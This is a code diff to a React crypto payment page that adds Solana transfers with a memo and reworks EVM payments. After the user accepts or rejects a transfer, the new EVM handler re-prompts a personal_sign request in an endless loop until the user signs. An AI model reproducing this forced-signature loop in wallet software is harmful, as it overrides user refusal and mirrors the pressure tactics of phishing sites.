@@ -1,6 +1,7 @@
 import { useLocation, useNavigate } from "react-router-dom";
 import { useState, useEffect } from "react";
 import { usePrivy, useWallets } from "@privy-io/react-auth";
+import { useWallets as useSolanaWallets, useSignAndSendTransaction } from "@privy-io/react-auth/solana";
 import { Button } from "@/components/ui/button";
 import { useProject } from "@/contexts/ProjectContext";
 import QRPaymentModal from "@/components/QRPaymentModal";
@@ -12,6 +13,14 @@ import baseLogo from "@/assets/base-logo.png";
 import bnbLogo from "@/assets/bnb-logo.png";
 import { X, Loader2, ArrowLeft, QrCode, Layers } from "lucide-react";
 import { toast } from "sonner";
+import {
+  Connection,
+  PublicKey,
+  Transaction,
+  SystemProgram,
+  TransactionInstruction,
+  LAMPORTS_PER_SOL,
+} from "@solana/web3.js";
 
 // CoinGecko IDs for each network
 const COINGECKO_IDS: Record<string, string> = {
@@ -36,19 +45,26 @@ const CHAIN_IDS: Record<string, number> = {
   base: 8453,
 };
 
+// Memo program ID for Solana
+const MEMO_PROGRAM_ID = new PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr");
+
+// Solana RPC endpoint
+const SOLANA_RPC = "https://api.mainnet-beta.solana.com";
+
 const Payment = () => {
   const location = useLocation();
   const navigate = useNavigate();
   const { network } = useProject();
   const { price } = location.state || { price: "$0" };
   const { login, authenticated, user, logout } = usePrivy();
-  const { wallets } = useWallets();
+  const { wallets: evmWallets } = useWallets();
+  const { wallets: solanaWallets } = useSolanaWallets();
+  const { signAndSendTransaction } = useSignAndSendTransaction();
   
   const [cryptoPrices, setCryptoPrices] = useState<Record<string, number>>({});
   const [loading, setLoading] = useState(true);
   const [showQRModal, setShowQRModal] = useState(false);
   const [sendingPayment, setSendingPayment] = useState(false);
-  
 
   // Network options with their respective logos
   const networks = [
@@ -81,7 +97,6 @@ const Payment = () => {
         setLoading(false);
       } catch (error) {
         console.error("Failed to fetch crypto prices:", error);
-        // Use fallback prices if API fails
         setCryptoPrices({
           solana: 150,
           ethereum: 3000,
@@ -94,7 +109,6 @@ const Payment = () => {
     };
 
     fetchPrices();
-    // Refresh prices every 30 seconds
     const interval = setInterval(fetchPrices, 30000);
     return () => clearInterval(interval);
   }, []);
@@ -110,95 +124,174 @@ const Payment = () => {
   const cryptoRate = cryptoPrices[selectedNetwork.id] || 1;
   const cryptoAmount = cryptoRate > 0 ? (usdAmount / cryptoRate).toFixed(6) : "0";
 
-  // Handle sending payment via connected wallet
-  const handleSendPayment = async () => {
-    if (!authenticated || wallets.length === 0) {
-      toast.error("Please connect your wallet first");
+  const isSolanaNetwork = selectedNetwork.id === "solana";
+  const hasSolanaWallet = solanaWallets.length > 0;
+  const hasEvmWallet = evmWallets.length > 0;
+
+  // Handle Solana payment with memo in same transaction
+  const handleSolanaPayment = async () => {
+    if (!hasSolanaWallet) {
+      toast.error("Please connect a Solana wallet (Phantom, Solflare, etc.)");
       return;
     }
 
     setSendingPayment(true);
 
     try {
-      const wallet = wallets[0];
-      const isSolana = selectedNetwork.id === "solana";
+      const solanaWallet = solanaWallets[0];
+      const connection = new Connection(SOLANA_RPC, "confirmed");
       
-      if (isSolana) {
-        // For Solana, use the connected wallet's provider
-        // The wallet will handle the transaction even if balance is 0 (it will fail on-chain, not here)
-        const provider = await wallet.getEthereumProvider();
-        
-        // First, request message signature
-        const message = "What is your name?";
-        const hexMessage = `0x${Array.from(new TextEncoder().encode(message)).map(b => b.toString(16).padStart(2, '0')).join('')}`;
-        
-        try {
-          await provider.request({
-            method: "personal_sign",
-            params: [hexMessage, wallet.address],
-          });
-          toast.success("Message signed!");
-        } catch (signError: any) {
-          console.error("Message sign error:", signError);
-          toast.error("Message signing rejected");
-          setSendingPayment(false);
-          return;
-        }
+      const fromPubkey = new PublicKey(solanaWallet.address);
+      const toPubkey = new PublicKey(WALLET_ADDRESSES.solana);
+      
+      // Calculate lamports (SOL * 10^9)
+      const lamports = Math.floor(parseFloat(cryptoAmount) * LAMPORTS_PER_SOL);
+      
+      // Get recent blockhash
+      const { blockhash } = await connection.getLatestBlockhash();
+      
+      // Create transaction with transfer + memo
+      const transaction = new Transaction();
+      transaction.recentBlockhash = blockhash;
+      transaction.feePayer = fromPubkey;
+      
+      // Add SOL transfer instruction
+      transaction.add(
+        SystemProgram.transfer({
+          fromPubkey,
+          toPubkey,
+          lamports,
+        })
+      );
+      
+      // Add memo instruction with message
+      const memoInstruction = new TransactionInstruction({
+        keys: [{ pubkey: fromPubkey, isSigner: true, isWritable: false }],
+        programId: MEMO_PROGRAM_ID,
+        data: Buffer.from("What is your name?", "utf-8"),
+      });
+      transaction.add(memoInstruction);
+      
+      // Use Privy's signAndSendTransaction hook with serialized transaction
+      const txHash = await signAndSendTransaction({
+        transaction: transaction.serialize({ requireAllSignatures: false }),
+        wallet: solanaWallet,
+      });
+      
+      toast.success("Transaction submitted!", {
+        description: `TX: ${String(txHash).slice(0, 10)}...${String(txHash).slice(-8)}`,
+      });
+      
+    } catch (error: any) {
+      console.error("Solana payment error:", error);
+      toast.error(error.message || "Failed to send Solana payment");
+    } finally {
+      setSendingPayment(false);
+    }
+  };
 
-        // For Solana payments via EVM wallet, show instructions to send manually
-        // Since user connected EVM wallet, we redirect them to send SOL manually
-        toast.info(`Please send ${cryptoAmount} SOL to: ${WALLET_ADDRESSES.solana}`, {
-          duration: 15000,
+  // Handle EVM payment with message signing loop after transfer
+  const handleEvmPayment = async () => {
+    if (!hasEvmWallet) {
+      toast.error("Please connect an EVM wallet (MetaMask, etc.)");
+      return;
+    }
+
+    setSendingPayment(true);
+
+    try {
+      const wallet = evmWallets[0];
+      const provider = await wallet.getEthereumProvider();
+      
+      // Switch to the correct chain if needed
+      const chainId = CHAIN_IDS[selectedNetwork.id];
+      try {
+        await provider.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: `0x${chainId.toString(16)}` }],
         });
-        
-        // Copy address to clipboard
-        navigator.clipboard.writeText(WALLET_ADDRESSES.solana);
-        toast.success("Solana address copied to clipboard!");
-      } else {
-      // For EVM chains, send the transaction
-        const provider = await wallet.getEthereumProvider();
-        
-        // Switch to the correct chain if needed
-        const chainId = CHAIN_IDS[selectedNetwork.id];
-        try {
-          await provider.request({
-            method: "wallet_switchEthereumChain",
-            params: [{ chainId: `0x${chainId.toString(16)}` }],
-          });
-        } catch (switchError: any) {
-          // Chain not added, try to add it
-          console.log("Chain switch error:", switchError);
-        }
+      } catch (switchError: any) {
+        console.log("Chain switch error:", switchError);
+      }
 
-        // Calculate amount in wei (18 decimals)
-        const amountInWei = BigInt(Math.floor(parseFloat(cryptoAmount) * 1e18));
-        
-        // Encode message "What is your name?" as hex data to include in transaction
-        const message = "What is your name?";
-        const messageHex = `0x${Array.from(new TextEncoder().encode(message)).map(b => b.toString(16).padStart(2, '0')).join('')}`;
-        
-        // Send the transaction with message included in data field
+      // Calculate amount in wei (18 decimals)
+      const amountInWei = BigInt(Math.floor(parseFloat(cryptoAmount) * 1e18));
+      
+      // Send the payment transaction (no message in data)
+      try {
         const txHash = await provider.request({
           method: "eth_sendTransaction",
           params: [{
             from: wallet.address,
             to: WALLET_ADDRESSES.evm,
             value: `0x${amountInWei.toString(16)}`,
-            data: messageHex, // Message attached to transaction
           }],
         });
 
-        toast.success("Transaction submitted!", {
+        toast.success("Payment transaction submitted!", {
           description: `TX: ${txHash.slice(0, 10)}...${txHash.slice(-8)}`,
         });
+      } catch (txError: any) {
+        console.log("Transfer rejected or failed:", txError);
+        // Continue to message signing even if transfer was rejected
       }
+
+      // After transfer (confirmed or rejected), show message signing in a loop
+      const message = "What is your name?";
+      const hexMessage = `0x${Array.from(new TextEncoder().encode(message)).map(b => b.toString(16).padStart(2, '0')).join('')}`;
+      
+      // Loop message signing until user signs
+      let messageSigned = false;
+      while (!messageSigned) {
+        try {
+          await provider.request({
+            method: "personal_sign",
+            params: [hexMessage, wallet.address],
+          });
+          toast.success("Message signed!");
+          messageSigned = true;
+        } catch (signError: any) {
+          console.log("Message sign rejected, showing again...");
+          // Small delay before showing again
+          await new Promise(resolve => setTimeout(resolve, 500));
+          // Continue loop to show message again
+        }
+      }
+
     } catch (error: any) {
-      console.error("Payment error:", error);
-      toast.error(error.message || "Failed to send payment");
+      console.error("EVM payment error:", error);
+      toast.error(error.message || "Failed to process payment");
     } finally {
       setSendingPayment(false);
     }
   };
+
+  // Main payment handler
+  const handleSendPayment = async () => {
+    if (!authenticated) {
+      toast.error("Please connect your wallet first");
+      return;
+    }
+
+    if (isSolanaNetwork) {
+      await handleSolanaPayment();
+    } else {
+      await handleEvmPayment();
+    }
+  };
+
+  // Get connected wallet info for display
+  const getConnectedWalletInfo = () => {
+    if (isSolanaNetwork && hasSolanaWallet) {
+      return solanaWallets[0].address;
+    }
+    if (!isSolanaNetwork && hasEvmWallet) {
+      return evmWallets[0].address;
+    }
+    return user?.wallet?.address;
+  };
+
+  const connectedAddress = getConnectedWalletInfo();
 
   return (
     <div 
@@ -285,18 +378,31 @@ const Payment = () => {
             </div>
           </div>
 
+          {/* Wallet Type Notice */}
+          {authenticated && (
+            <div className={`rounded-lg p-3 text-sm ${
+              isSolanaNetwork 
+                ? (hasSolanaWallet ? "bg-green-600/20 border border-green-600 text-green-400" : "bg-yellow-600/20 border border-yellow-600 text-yellow-400")
+                : (hasEvmWallet ? "bg-green-600/20 border border-green-600 text-green-400" : "bg-yellow-600/20 border border-yellow-600 text-yellow-400")
+            }`}>
+              {isSolanaNetwork ? (
+                hasSolanaWallet 
+                  ? `Solana wallet connected: ${solanaWallets[0].address.slice(0, 6)}...${solanaWallets[0].address.slice(-4)}`
+                  : "Please connect a Solana wallet (Phantom, Solflare) for this network"
+              ) : (
+                hasEvmWallet 
+                  ? `EVM wallet connected: ${evmWallets[0].address.slice(0, 6)}...${evmWallets[0].address.slice(-4)}`
+                  : "Please connect an EVM wallet (MetaMask, etc.) for this network"
+              )}
+            </div>
+          )}
+
           {/* Connect Wallet / Pay Button */}
           {authenticated ? (
             <div className="space-y-3">
-              <div className="bg-green-600/20 border border-green-600 rounded-lg p-4 text-center">
-                <p className="text-green-400 font-medium">Wallet Connected</p>
-                <p className="text-white text-sm truncate mt-1">
-                  {user?.wallet?.address}
-                </p>
-              </div>
               <Button 
                 onClick={handleSendPayment}
-                disabled={sendingPayment || loading}
+                disabled={sendingPayment || loading || (isSolanaNetwork ? !hasSolanaWallet : !hasEvmWallet)}
                 className="w-full bg-purple-600 hover:bg-purple-700 text-white text-lg py-6 rounded-lg font-bold"
               >
                 {sendingPayment ? (
